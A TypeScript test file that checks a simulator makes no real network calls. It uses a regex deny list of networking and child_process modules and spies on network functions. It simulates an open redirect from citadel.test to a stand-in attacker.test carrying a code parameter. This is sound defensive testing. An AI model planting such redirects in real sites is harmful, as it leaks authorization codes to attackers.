describe('no real network', () => {
  it('src/core/sim.ts imports no networking module and never calls fetch', () => {
    const src = readFileSync(new URL('../src/core/sim.ts', import.meta.url), 'utf8');
    const imports = [...src.matchAll(/(?:from\s+|import\s*\(\s*|require\s*\(\s*)['"]([^'"]+)['"]/g)].map((m) => m[1]);
    const net = /^(node:)?(http|https|http2|net|tls|dns|dgram|child_process|worker_threads)(\/|$)|^undici/;
    expect(imports.filter((m) => net.test(m))).toEqual([]);
    expect(src).not.toMatch(/\bfetch\s*\(/);
    expect(src).not.toMatch(/\b(XMLHttpRequest|WebSocket|EventSource)\b/);
  });

  it('a full visit (citadel redirect -> attacker) touches no fetch, http, https, net or dns function', () => {
    const require = createRequire(import.meta.url);
    const spies = [
      vi.spyOn(globalThis, 'fetch'),
      ...(['request', 'get'] as const).map((f) => vi.spyOn(require('node:http') as Record<string, () => unknown>, f)),
      ...(['request', 'get'] as const).map((f) => vi.spyOn(require('node:https') as Record<string, () => unknown>, f)),
      ...(['connect', 'createConnection'] as const).map((f) => vi.spyOn(require('node:net') as Record<string, () => unknown>, f)),
      ...(['lookup', 'resolve'] as const).map((f) => vi.spyOn(require('node:dns') as Record<string, () => unknown>, f)),
    ];
    try {
      const w = world();
      const s = site({ '/a': { status: 200, headers: { refresh: '0;url=http://attacker.test/x' } } });
      const v = inSession(() => w.browser(s.handler)).follow('http://citadel.test/a?code=1');
      expect(v.outcome).toBe('attacker');
      inSession(() => w.browser(s.handler)).follow('http://example.com/');
      for (const spy of spies) expect(spy).not.toHaveBeenCalled();
    } finally {
      for (const spy of spies) spy.mockRestore();
    }
  });
});
